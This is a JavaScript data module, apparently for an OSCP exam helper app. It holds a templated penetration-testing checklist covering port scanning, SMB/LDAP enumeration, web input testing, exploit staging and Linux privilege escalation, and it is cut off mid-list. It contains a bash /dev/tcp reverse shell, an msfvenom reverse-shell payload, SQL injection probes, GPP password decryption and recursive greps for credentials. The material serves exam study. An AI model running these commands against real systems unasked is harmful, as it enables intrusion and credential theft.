import { normalizeChecklist } from "../lib/commandContract.js";

export const DEFAULT_VARIABLES = {
  workspaceRoot: "/home/kali/oscp",
  lhost: "10.10.14.2",
  lport: "443",
  rhost: "",
  targetSlug: "",
  tcpPorts: "",
  udpPorts: "",
  selectedServiceHost: "",
  selectedServicePort: "",
  webScheme: "http",
  webPort: "80",
  vhost: "",
  baseUrl: "",
  webPath: "index.php",
  webParameter: "id",
  webValue: "FN_PROBE",
  sessionCookie: "",
  uploadFile: "",
  uploadField: "file",
  uploadedRemotePath: "",
  rport: "",
  uport: "",
  targetName: "",
  userFlagName: "local.txt",
  rootFlagName: "proof.txt",
  domain: "",
  realm: "",
  baseDn: "",
  dc: "",
  dcIp: "",
  dnsServer: "",
  user: "",
  selectedCredentialId: "",
  credentialType: "",
  memberUser: "",
  temporaryUser: "",
  temporaryPassword: "",
  temporaryCreatorCredentialId: "",
  targetGroup: "",
  aclTarget: "",
  aclPrincipal: "",
  aclRights: "DCSync",
  dcsyncUser: "Administrator",
  bloodhoundSource: "",
  bloodhoundTarget: "",
  password: "",
  gppCpassword: "",
  gppXmlFile: "",
  hash: "",
  smbShare: "SYSVOL",
  smbDirectory: ".",
  nfsExport: "",
  exploitQuery: "",
  exploitId: "",
  exploitFile: "",
  compiledExploit: "",
  transferFile: "",
  hashesFile: "",
  hashMode: "",
  sprayPassword: "",
  sprayJitter: "3-5",
  sprayRockyouLimit: "25",
  subnet: "172.16.10.0/24",
  pivotHost: "",
  pivotUser: "",
  pivotInterface: "ligolo",
  proxyPort: "1080",
  internalHost: "",
  internalSubnet: "172.16.10.0/24",
  callbackHost: "",
  interface: "tun0",
  wordlist: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
};

export const VARIABLE_GROUPS = [
  { label: "Workspace", keys: ["workspaceRoot"] },
  { label: "Operator", keys: ["lhost", "lport", "interface", "callbackHost"] },
  { label: "Target", keys: ["targetName", "targetSlug", "rhost", "tcpPorts", "udpPorts", "selectedServiceHost", "selectedServicePort", "userFlagName", "rootFlagName"] },
  { label: "Web", keys: ["webScheme", "webPort", "vhost", "baseUrl", "webPath", "webParameter", "webValue", "sessionCookie", "uploadFile", "uploadField", "uploadedRemotePath"] },
  { label: "Identity", keys: ["domain", "realm", "baseDn", "dc", "dcIp", "dnsServer", "user", "credentialType", "memberUser", "temporaryUser", "temporaryPassword", "temporaryCreatorCredentialId", "targetGroup", "aclTarget", "aclPrincipal", "aclRights", "dcsyncUser", "bloodhoundSource", "bloodhoundTarget", "password", "gppCpassword", "hash"] },
  { label: "Pivot", keys: ["pivotHost", "pivotUser", "pivotInterface", "proxyPort", "subnet", "internalHost", "internalSubnet"] },
  { label: "Resources", keys: ["smbShare", "smbDirectory", "nfsExport", "gppXmlFile", "exploitQuery", "exploitId", "exploitFile", "compiledExploit", "transferFile", "hashesFile", "hashMode", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
];

const CHECKLIST_SOURCE = [
  {
    id: "setup",
    number: "00",
    title: "Workspace setup",
    summary: "Make the evidence path, variables, and Kali resources predictable before touching the target.",
    items: [
      {
        id: "setup-workspace",
        title: "Create a target workspace",
        detail: "Keep raw scans and evidence separate from working files.",
        commands: [
          { label: "Create folders", value: "root='{{workspaceRoot}}/{{targetSlug}}'; umask 077; mkdir -p \"$root\"/{scans,web,loot,exploits,notes}; chmod 700 \"$root\"; find \"$root\" -mindepth 1 -exec chmod go-rwx {} +; find \"$root\" -mindepth 1 -maxdepth 1 -type d -printf '%f\\n' | sort" },
          {
            label: "Start command log",
            purpose: "Start one reusable interactive Kali shell whose complete transcript is appended to this machine's private evidence log.",
            runsOn: "lhost",
            resultCategory: "preparation",
            sessionRole: "machine-log",
            terminalBehavior: "interactive-shell",
            requiresNewSession: true,
            stateChange: "local-evidence",
            risk: "low",
            verificationCommand: "test -f '{{workspaceRoot}}/{{targetSlug}}/notes/terminal.log' && test -w '{{workspaceRoot}}/{{targetSlug}}/notes/terminal.log'",
            cleanup: { required: true, command: "exit", note: "Run the matching Stop terminal log card in this exact machine-log tab." },
            sideEffects: "Keeps one interactive local shell running and appends its terminal transcript until that shell exits.",
            value: "script -a '{{workspaceRoot}}/{{targetSlug}}/notes/terminal.log'",
          },
        ],
      },
      {
        id: "setup-network",
        title: "Confirm VPN address and route",
        commands: [
          { label: "Interface", value: "ip -br address show {{interface}} && ip route" },
          { label: "Set local host", value: "export LHOST=$(ip -4 -o addr show {{interface}} | awk '{print $4}' | cut -d/ -f1) && echo $LHOST" },
        ],
      },
      {
        id: "setup-resources",
        title: "Verify Kali resource paths",
        detail: "Use the packaged resources first; discover exact binary names instead of assuming them.",
        commands: [
          { label: "Resource links", value: "ls -ld /usr/share/windows-resources /usr/share/wordlists /usr/share/seclists /usr/share/ligolo-ng-common-binaries" },
          { label: "Useful Windows binaries", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*' -o -iname 'nc.exe' -o -iname 'mimikatz*' \\) 2>/dev/null" },
          { label: "Ligolo binaries", value: "find /usr/share/ligolo-ng-common-binaries -maxdepth 2 -type f -printf '%p\n'" },
        ],
      },
      {
        id: "setup-reachability",
        title: "Record baseline reachability",
        commands: [
          { label: "Ping", value: "ping -c 2 {{rhost}}" },
          { label: "No ICMP fallback", value: "sudo nmap -Pn -n -p 22,80,443,445,3389 {{rhost}}" },
        ],
      },
    ],
  },
  {
    id: "recon",
    number: "01",
    title: "Port discovery",
    summary: "Scan every TCP port, then investigate services with focused scripts. Do not let a default scan define the box.",
    items: [
      {
        id: "recon-tcp-all",
        title: "Scan all TCP ports",
        commands: [
          { label: "Full TCP", value: "base='{{workspaceRoot}}/{{targetSlug}}/scans/tcp-all'; sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA \"$base\" {{rhost}}; scan_status=$?; owner_status=0; for artifact in \"${base}.nmap\" \"${base}.gnmap\" \"${base}.xml\"; do if test -e \"$artifact\"; then sudo chown -- \"$(id -u):$(id -g)\" \"$artifact\" && chmod 600 -- \"$artifact\" || owner_status=1; fi; done; test \"$scan_status\" -eq 0 && test \"$owner_status\" -eq 0" },
          { label: "Extract ports", value: "grep -oP '\\d+/open' '{{workspaceRoot}}/{{targetSlug}}/scans/tcp-all.gnmap' | cut -d/ -f1 | paste -sd, -" },
        ],
      },
      {
        id: "recon-tcp-detail",
        title: "Fingerprint open TCP services",
        commands: [
          { label: "Focused scan", value: "base='{{workspaceRoot}}/{{targetSlug}}/scans/tcp-detail'; sudo nmap -Pn -n -sCV -p {{tcpPorts}} -oA \"$base\" {{rhost}}; scan_status=$?; owner_status=0; for artifact in \"${base}.nmap\" \"${base}.gnmap\" \"${base}.xml\"; do if test -e \"$artifact\"; then sudo chown -- \"$(id -u):$(id -g)\" \"$artifact\" && chmod 600 -- \"$artifact\" || owner_status=1; fi; done; test \"$scan_status\" -eq 0 && test \"$owner_status\" -eq 0" },
          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{tcpPorts}} -oN {{workspaceRoot}}/{{targetSlug}}/scans/tcp-vuln.txt {{rhost}}" },
        ],
      },
      {
        id: "recon-udp",
        title: "Check common UDP services",
        commands: [
          { label: "Top UDP", value: "base='{{workspaceRoot}}/{{targetSlug}}/scans/udp-top100'; sudo nmap -Pn -n -sU --top-ports 100 --open -oA \"$base\" {{rhost}}; scan_status=$?; owner_status=0; for artifact in \"${base}.nmap\" \"${base}.gnmap\" \"${base}.xml\"; do if test -e \"$artifact\"; then sudo chown -- \"$(id -u):$(id -g)\" \"$artifact\" && chmod 600 -- \"$artifact\" || owner_status=1; fi; done; test \"$scan_status\" -eq 0 && test \"$owner_status\" -eq 0" },
          { label: "Focused UDP", value: "output='{{workspaceRoot}}/{{targetSlug}}/scans/udp-detail.txt'; sudo nmap -Pn -n -sU -sV -p {{udpPorts}} -oN \"$output\" {{rhost}}; scan_status=$?; owner_status=0; if test -e \"$output\"; then sudo chown -- \"$(id -u):$(id -g)\" \"$output\" && chmod 600 -- \"$output\" || owner_status=1; fi; test \"$scan_status\" -eq 0 && test \"$owner_status\" -eq 0" },
        ],
      },
      {
        id: "recon-hostnames",
        title: "Resolve hostnames and virtual hosts",
        commands: [
          { label: "Certificate names", value: "for port in $(echo '{{tcpPorts}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee {{workspaceRoot}}/{{targetSlug}}/scans/certificates.txt" },
          { label: "SSL cert scan", value: "nmap -Pn -n -p {{tcpPorts}} --script ssl-cert -oN {{workspaceRoot}}/{{targetSlug}}/scans/ssl-certs.txt {{rhost}}" },
          { label: "Hosts entry", value: "echo '{{rhost}} {{vhost}} {{dc}} {{domain}}' | sudo tee -a /etc/hosts" },
        ],
      },
    ],
  },
  {
    id: "services",
    number: "02",
    title: "Service enumeration",
    summary: "Use a few dependable Kali tools and save raw output. Reuse every valid credential across exposed services.",
    items: [
      {
        id: "svc-smb",
        title: "SMB / RPC (139, 445)",
        detail: "Guest and null-session checks are always shown as deliberate checks; success is never assumed. Save share, domain-user, and display-information queries separately so each result can be reviewed and imported as unverified evidence. Authenticated commands appear only for the one credential explicitly selected for this machine. Downloads stay in an identity-specific folder; repeated bad passwords can lock accounts.",
        commands: [
          { label: "Anonymous SMB", value: "nxc smb {{rhost}} -u '' -p '' --shares --users --groups" },
          { label: "Null-session SMB share inventory", value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}/loot/rpc'; smbclient -N -L '//{{rhost}}' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/rpc/smb-null-shares.txt'" },
          { label: "Null-session RPC domain users", value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}/loot/rpc'; rpcclient -N -U '' '{{rhost}}' -c 'enumdomusers' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/rpc/enumdomusers.txt'" },
          { label: "Null-session RPC user display information", value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}/loot/rpc'; rpcclient -N -U '' '{{rhost}}' -c 'querydispinfo' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/rpc/querydispinfo.txt'" },
          { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
          { label: "Triage all downloaded SMB loot", value: "find '{{workspaceRoot}}/{{targetSlug}}/loot/smb' -type f -printf '%s %p\\n' | sort -nr > '{{workspaceRoot}}/{{targetSlug}}/loot/smb-file-index.txt'; grep -RniI -E 'pass(word)?|passwd|pwd|secret|token|api.?key|connection.?string|cpassword|user(name)?|BEGIN (RSA |OPENSSH )?PRIVATE KEY' '{{workspaceRoot}}/{{targetSlug}}/loot/smb' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/smb-credential-hits.txt'" },
        ],
      },
      {
        id: "svc-smb-gpp",
        title: "Group Policy Preferences (GPP) credentials",
        detail: "A cpassword from an XML file is encrypted data, not the login password. Preserve the XML and its userName/runAs field, decrypt the cpassword, then replace the normal user/password variables with the recovered credential before retesting SMB.",
        commands: [
          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' '{{workspaceRoot}}/{{targetSlug}}/loot/smb'" },
          { label: "Decrypt one cpassword", value: "gpp-decrypt '{{gppCpassword}}'" },
          { label: "Parse a saved XML file", value: "impacket-Get-GPPPassword LOCAL -xmlfile '{{gppXmlFile}}'" },
          { label: "Search SYSVOL with valid credentials", value: "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}@{{rhost}}' -dc-ip {{rhost}}" },
          { label: "Retest recovered credential", value: "nxc smb {{rhost}} -d '{{domain}}' -u '{{user}}' -p '{{password}}' --shares --users --groups" },
        ],
      },
      {
        id: "svc-ldap",
        title: "LDAP / Active Directory (389, 636)",
        detail: "Read the Root DSE first and set the confirmed domain/base DN. Then try one anonymous directory query; access denied is still useful evidence. Confirm any returned account names in Findings before they can feed Kerberos commands.",
        commands: [
          { label: "Root DSE", value: "ldapsearch -x -H ldap://{{rhost}} -s base namingContexts defaultNamingContext" },
          { label: "Anonymous LDAP user inventory", value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}/loot/ldap'; ldapsearch -x -LLL -H ldap://{{rhost}} -b '{{baseDn}}' '(&(objectCategory=person)(objectClass=user))' sAMAccountName memberOf | tee '{{workspaceRoot}}/{{targetSlug}}/loot/ldap/anonymous-users.txt'" },
          { label: "Authenticated users", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=user)' sAMAccountName memberOf" },
        ],
      },
      {
        id: "svc-nfs",
        title: "NFS / RPC (111, 2049)",
        commands: [
          { label: "List exports", value: "showmount -e {{rhost}}" },
          { label: "Enumerate NFS RPC methods", value: "nmap -Pn -p 111,2049 --script 'nfs-*' {{rhost}}" },
          { label: "Prepare local mount point", stateChange: "local-system", cleanup: { required: true, command: "sudo rmdir '/mnt/{{targetSlug}}'", note: "Remove the empty mount point only after unmounting the export." }, verificationCommand: "test -d '/mnt/{{targetSlug}}'", value: "sudo mkdir -p '/mnt/{{targetSlug}}'" },
          { label: "Mount selected export read-only", stateChange: "local-system", cleanup: { required: true, command: "sudo umount '/mnt/{{targetSlug}}'", note: "Unmount the assessment export before removing the mount point." }, verificationCommand: "findmnt '/mnt/{{targetSlug}}'", value: "sudo mount -t nfs '{{rhost}}:{{nfsExport}}' '/mnt/{{targetSlug}}' -o ro,nolock" },
        ],
      },
      {
        id: "svc-snmp",
        title: "SNMP (161/udp)",
        commands: [
          { label: "Find community", value: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{rhost}}" },
          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee '{{workspaceRoot}}/{{targetSlug}}/scans/snmpwalk.txt'" },
        ],
      },
      {
        id: "svc-dns",
        title: "DNS (53)",
        commands: [
          { label: "Records", value: "dig @{{rhost}} {{domain}} ANY +noall +answer; dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
          { label: "Zone transfer", value: "dig @{{rhost}} {{domain}} AXFR" },
        ],
      },
      {
        id: "svc-mail-ftp",
        title: "FTP and mail services",
        commands: [
          { label: "FTP anonymous", value: "ftp anonymous@{{rhost}}" },
          { label: "SMTP users", value: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{rhost}}" },
        ],
      },
      {
        id: "svc-rdp",
        title: "RDP (3389)",
        detail: "Enumerate the endpoint first. The client card appears with the explicitly selected credential; connect only after confirming RDP is exposed and the account is permitted to log on.",
        commands: [
          { label: "RDP encryption and identity", value: "nmap -Pn -n -p 3389 --script rdp-enum-encryption,rdp-ntlm-info {{rhost}}" },
          { label: "Open RDP with the selected credential", value: "xfreerdp3 /v:{{rhost}} /u:'{{user}}' /p:'{{password}}' /cert:ignore +clipboard" },
        ],
      },
      {
        id: "svc-databases",
        title: "Common databases and application services",
        detail: "Fingerprint the exact service before choosing one matching client. Use a single selected endpoint and credential; these cards do not sweep hosts or chain protocols.",
        commands: [
          { label: "Fingerprint common database ports", value: "nmap -Pn -n -sV -p 1433,1521,3306,5432,6379,27017 {{rhost}}" },
          { label: "MSSQL with selected domain credential", value: "impacket-mssqlclient '{{domain}}/{{user}}:{{password}}@{{rhost}}' -windows-auth" },
          { label: "MySQL prompt for selected credential", requiresSelectedCredential: true, value: "mysql --host {{rhost}} --port {{selectedServicePort}} --user '{{user}}' --password" },
          { label: "PostgreSQL prompt for selected credential", requiresSelectedCredential: true, value: "psql 'host={{rhost}} port={{selectedServicePort}} user={{user}} sslmode=prefer'" },
          { label: "Redis unauthenticated ping", value: "redis-cli -h {{rhost}} -p {{selectedServicePort}} PING" },
          { label: "MongoDB unauthenticated ping", value: "mongosh --host {{rhost}} --port {{selectedServicePort}} --quiet --eval 'db.runCommand({ ping: 1 })'" },
        ],
      },
    ],
  },
  {
    id: "web",
    number: "03",
    title: "Web enumeration",
    summary: "Map the application with curl and ffuf before reaching for specialized scanners.",
    items: [
      {
        id: "web-baseline",
        title: "Capture headers, technology, and source",
        commands: [
          { label: "Headers", value: "curl -k -i '{{webScheme}}://{{rhost}}:{{webPort}}/' | tee '{{workspaceRoot}}/{{targetSlug}}/web/root-response.txt'" },
          { label: "Fingerprint", value: "whatweb -a 3 '{{webScheme}}://{{rhost}}:{{webPort}}/'" },
          { label: "Common files", value: "for p in robots.txt sitemap.xml .git/HEAD .env; do echo ===$p; curl -ks \"{{webScheme}}://{{rhost}}:{{webPort}}/$p\"; done" },
        ],
      },
      {
        id: "web-content",
        title: "Discover content and files",
        commands: [
          { label: "Directories", value: "ffuf -u '{{webScheme}}://{{rhost}}:{{webPort}}/FUZZ' -w '{{wordlist}}' -e .php,.aspx,.txt,.bak,.zip -ac -c -o '{{workspaceRoot}}/{{targetSlug}}/web/ffuf-content.json'" },
          { label: "Parameters", value: "ffuf -u '{{webScheme}}://{{rhost}}:{{webPort}}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c" },
        ],
      },
      {
        id: "web-vhosts",
        title: "Discover virtual hosts",
        commands: [
          { label: "Vhosts", value: "ffuf -u '{{webScheme}}://{{rhost}}:{{webPort}}/' -H 'Host: FUZZ.{{domain}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
          { label: "DNS names", value: "ffuf -u '{{webScheme}}://FUZZ.{{domain}}:{{webPort}}/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
        ],
      },
      {
        id: "web-manual",
        title: "Test inputs and access controls manually",
        detail: "Proxy interesting requests, change one input at a time, and record the exact request that proves impact. Avoid automatic exploitation tools during the exam; verify the current OffSec restrictions before starting.",
        commands: [
          { label: "Replay request", value: "curl -k -i -X POST '{{webScheme}}://{{rhost}}:{{webPort}}/login' --data-urlencode 'username={{user}}' --data-urlencode 'password={{password}}'" },
          { label: "Manual SQLi baseline request", stateChange: "local-evidence", value: "curl -ksS -o '{{workspaceRoot}}/{{targetSlug}}/web/sqli-baseline.response' -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode '{{webParameter}}=1' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Manual SQLi true-condition request", stateChange: "local-evidence", value: "curl -ksS -o '{{workspaceRoot}}/{{targetSlug}}/web/sqli-true.response' -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode \"{{webParameter}}=1' AND '1'='1\" '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Manual SQLi false-condition request", stateChange: "local-evidence", value: "curl -ksS -o '{{workspaceRoot}}/{{targetSlug}}/web/sqli-false.response' -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode \"{{webParameter}}=1' AND '1'='2\" '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Compare saved SQLi responses", value: "sha256sum '{{workspaceRoot}}/{{targetSlug}}/web/sqli-baseline.response' '{{workspaceRoot}}/{{targetSlug}}/web/sqli-true.response' '{{workspaceRoot}}/{{targetSlug}}/web/sqli-false.response'" },
        ],
      },
      {
        id: "web-input-classes",
        title: "Validate traversal, inclusion, and command injection",
        detail: "Use the observed path and parameter, change one value at a time, and compare against a saved baseline. The operator supplies one bounded candidate; the app does not generate payloads or infer code execution.",
        commands: [
          { label: "Replay one traversal / inclusion candidate", value: "curl -k -i --path-as-is --get --data-urlencode '{{webParameter}}={{webValue}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Replay one command-injection candidate", value: "curl -k -i --get --data-urlencode '{{webParameter}}={{webValue}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
        ],
      },
      {
        id: "web-access-xss",
        title: "Compare access control and reflection",
        detail: "Replay the same resource without and with one operator-supplied session cookie. For XSS, use a unique harmless marker first and inspect the returned encoding/context before choosing any browser-side proof.",
        commands: [
          { label: "Anonymous resource request", value: "curl -k -i '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Authenticated resource request", value: "curl -k -i -H 'Cookie: {{sessionCookie}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Reflection-context probe", value: "curl -k -i --get --data-urlencode '{{webParameter}}={{webValue}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
        ],
      },
      {
        id: "web-upload",
        title: "Validate one file-upload path",
        detail: "Use a minimal benign file first. Record its local checksum, the exact multipart field, server response, returned path, retrieval behavior, and the application-specific deletion step. Do not leave an uploaded artifact behind.",
        commands: [
          { label: "Hash upload source", runsOn: "lhost", value: "sha256sum '{{uploadFile}}'" },
          { label: "Upload one reviewed file", runsOn: "lhost", stateChange: "target-file", cleanup: { required: true, command: "", note: "Delete the exact returned remote object through the application's supported delete path and verify it is no longer retrievable." }, verificationCommand: "curl -k -I '{{baseUrl}}/{{uploadedRemotePath}}'", value: "curl -k -i -F '{{uploadField}}=@{{uploadFile}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
          { label: "Verify returned upload path", runsOn: "lhost", value: "curl -k -I '{{baseUrl}}/{{uploadedRemotePath}}'" },
        ],
      },
      {
        id: "web-files-api",
        title: "Check file handling, backups, and API surface",
        detail: "Use observed routes and parameters. These commands identify capabilities; they do not prove an arbitrary file read, upload bypass, or authorization flaw by themselves.",
        commands: [
          { label: "Allowed methods", value: "curl -k -i -X OPTIONS '{{webScheme}}://{{rhost}}:{{webPort}}/'" },
          { label: "Common backup suffixes", value: "for path in index.php web.config appsettings.json package.json; do for suffix in .bak .old .zip '~'; do url=\"{{webScheme}}://{{rhost}}:{{webPort}}/$path$suffix\"; curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"$url\"; done; done" },
          { label: "API description files", value: "for path in swagger.json openapi.json api/docs swagger/index.html; do curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"{{webScheme}}://{{rhost}}:{{webPort}}/$path\"; done" },
        ],
      },
    ],
  },
  {
    id: "access",
    number: "04",
    title: "Initial access & transfer",
    summary: "Validate versions, read the exploit, stage only what you need, and stabilize the first shell.",
    items: [
      {
        id: "access-research",
        title: "Research the exact service version",
        commands: [
          { label: "Searchsploit", value: "searchsploit --exclude='(PoC)|dos' '{{exploitQuery}}'" },
          { label: "Copy one reviewed exploit locally", stateChange: "local-evidence", value: "searchsploit -m '{{exploitId}}'" },
          { label: "Inspect copied source", value: "sed -n '1,240p' '{{exploitFile}}'" },
        ],
      },
      {
        id: "access-adapt-exploit",
        title: "Adapt a public exploit before any target use",
        detail: "Read the source and references, confirm architecture and dependencies, identify every target-specific parameter, and compile locally. These cards do not execute the exploit or choose a payload.",
        commands: [
          { label: "Record source type and checksum", value: "file '{{exploitFile}}'; sha256sum '{{exploitFile}}'" },
          { label: "Review target-specific parameters", value: "grep -nE 'RHOST|RPORT|LHOST|LPORT|TARGET|URL|HOST|PORT|offset|arch|payload' '{{exploitFile}}'" },
          { label: "Check local compiler architecture", value: "gcc -dumpmachine; uname -m" },
          { label: "Compile-check C source without output", value: "gcc -Wall -Wextra -fsyntax-only '{{exploitFile}}'" },
          { label: "Compile reviewed C source locally", stateChange: "local-evidence", verificationCommand: "file '{{compiledExploit}}'; sha256sum '{{compiledExploit}}'", cleanup: { required: false, command: "", note: "Retain the reviewed binary with its source and checksum as machine-scoped working evidence, or remove that exact path after the assessment." }, value: "gcc -Wall -Wextra -O2 '{{exploitFile}}' -o '{{compiledExploit}}'" },
          { label: "Inspect compiled architecture and dependencies", value: "file '{{compiledExploit}}'; readelf -h '{{compiledExploit}}'; ldd '{{compiledExploit}}'" },
        ],
      },
      {
        id: "access-remote",
        title: "Try remote access with discovered credentials",
        detail: "Commands are generated only from the one credential explicitly selected for this machine. A valid SMB login is not automatically a shell: Evil-WinRM requires WinRM and permission to use it, while NetExec SMB execution and WMI require administrator access. Look for Pwn3d in NetExec output. If authentication works but every shell method fails, record that result before choosing another check.",
        commands: [
          { label: "Check remote-management ports", value: "nmap -Pn -n -sV --open -p 22,445,3389,5985,5986 -oN '{{workspaceRoot}}/{{targetSlug}}/scans/remote-access.txt' {{rhost}}" },
        ],
      },
      {
        id: "access-listener",
        title: "Start a listener",
        commands: [
          { label: "Netcat", value: "rlwrap -cAr nc -lvnp {{lport}}" },
          { label: "Socat TTY", value: "socat file:$(tty),raw,echo=0 tcp-listen:{{lport}}" },
        ],
      },
      {
        id: "access-shells",
        title: "Prepare simple reverse-shell payloads",
        commands: [
          { label: "Bash", value: "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'" },
          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o '{{workspaceRoot}}/{{targetSlug}}/exploits/shell.exe'" },
        ],
      },
      {
        id: "access-transfer",
        title: "Transfer files from Kali",
        detail: "Use target-side staging only when the check inherently needs a local helper. Prefer packaged Kali resources, transfer the smallest file, compare source and destination SHA-256 values, save the relevant output, then remove the transferred file.",
        commands: [
          { label: "Serve current folder", runsOn: "lhost", value: "python3 -m http.server 8000 --bind {{lhost}}" },
          { label: "Hash source on Kali", runsOn: "lhost", value: "sha256sum '{{transferFile}}'" },
          { label: "Stage on Linux", runsOn: "foothold-linux", value: "curl 'http://{{lhost}}:8000/{{transferFile}}' -o '/tmp/{{transferFile}}'" },
          { label: "Verify Linux checksum", runsOn: "foothold-linux", value: "sha256sum '/tmp/{{transferFile}}'" },
          { label: "Mark Linux helper executable", runsOn: "foothold-linux", stateChange: "target-file", value: "chmod 700 '/tmp/{{transferFile}}'" },
          { label: "Remove Linux helper", runsOn: "foothold-linux", stateChange: "target-file", cleanup: { required: false, command: "", note: "This command is the cleanup action." }, verificationCommand: "test ! -e '/tmp/{{transferFile}}'", value: "rm -f '/tmp/{{transferFile}}'" },
          { label: "Stage on Windows", runsOn: "foothold-windows", value: "powershell -c \"iwr 'http://{{lhost}}:8000/{{transferFile}}' -OutFile 'C:\\Windows\\Temp\\{{transferFile}}'\"" },
          { label: "Verify Windows checksum", runsOn: "foothold-windows", value: "certutil -hashfile \"C:\\Windows\\Temp\\{{transferFile}}\" SHA256" },
          { label: "Remove Windows helper", runsOn: "foothold-windows", stateChange: "target-file", cleanup: { required: false, command: "", note: "This command is the cleanup action." }, verificationCommand: "powershell -c \"if (Test-Path 'C:\\Windows\\Temp\\{{transferFile}}') { exit 1 }\"", value: "powershell -c \"Remove-Item -Force 'C:\\Windows\\Temp\\{{transferFile}}'\"" },
        ],
      },
      {
        id: "access-tty",
        title: "Upgrade a Linux shell",
        commands: [
          { label: "Spawn PTY", value: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
          { label: "Fix terminal", value: "export TERM=xterm-256color; stty rows 40 columns 120" },
        ],
      },
    ],
  },
  {
    id: "linux-privesc",
    number: "05",
    title: "Linux privilege escalation",
    summary: "Start with identity and delegated rights, then inspect credentials, scheduled work, file permissions, and capabilities.",
    items: [
      {
        id: "linux-context",
        title: "Capture host and user context",
        commands: [
          { label: "Identity", value: "id; hostname; uname -a; cat /etc/os-release; ip -br a" },
          { label: "Sudo", value: "sudo -l" },
        ],
      },
      {
        id: "linux-files",
        title: "Check SUID, capabilities, and writable paths",
        commands: [
          { label: "SUID", value: "find / -perm -4000 -type f 2>/dev/null" },
          { label: "Capabilities", value: "getcap -r / 2>/dev/null" },
          { label: "Writable", value: "find /etc /opt /var /usr/local -writable -type f 2>/dev/null | head -200" },
        ],
      },
      {
        id: "linux-jobs",
        title: "Inspect processes and scheduled jobs",
        commands: [
          { label: "Processes", value: "ps auxwwf; ss -lntup" },
          { label: "Schedules", value: "cat /etc/crontab; ls -la /etc/cron* /var/spool/cron 2>/dev/null" },
          { label: "Systemd", value: "systemctl list-timers --all; find /etc/systemd /usr/lib/systemd -writable -type f 2>/dev/null" },
        ],
      },
      {
        id: "linux-secrets",
        title: "Search likely credential locations",
        commands: [
          { label: "Config secrets", value: "grep -RniE 'pass(word)?|secret|token|api.?key' /var/www /opt /home 2>/dev/null | head -200" },
          { label: "History and keys", value: "find /home /root -maxdepth 3 \\( -name '.*history' -o -name 'id_rsa' -o -name '*.kdbx' \\) -ls 2>/dev/null" },
        ],
      },
      {
        id: "linux-storage-groups",
        title: "Check mounts, backups, and privileged groups",
        commands: [
          { label: "Storage and mounts", value: "lsblk -f; findmnt; df -h; cat /etc/fstab" },
          { label: "Groups and sockets", value: "id; getent group docker lxd disk adm 2>/dev/null; find /var/run -type s -ls 2>/dev/null" },
          { label: "Backups and application roots", value: "find /var/backups /opt /srv /usr/local -maxdepth 3 -type f -printf '%M %u:%g %p\\n' 2>/dev/null | head -250" },
        ],
      },
      {
        id: "linux-kernel-last-resort",
        title: "Consider kernel exposure last",
        detail: "Use kernel exploitation only after higher-signal permission, credential, job, group, mount, container, and service checks. Confirm the exact build, architecture, mitigations, and exploit source before any attempt.",
        commands: [
          { label: "Capture exact kernel and architecture", runsOn: "foothold-linux", value: "uname -a; cat /proc/version; getconf LONG_BIT; cat /proc/sys/kernel/randomize_va_space 2>/dev/null" },
          { label: "Search packaged exploit references", runsOn: "lhost", value: "searchsploit --exclude='(PoC)|dos' '{{exploitQuery}}'" },
        ],
      },
    ],
  },
  {
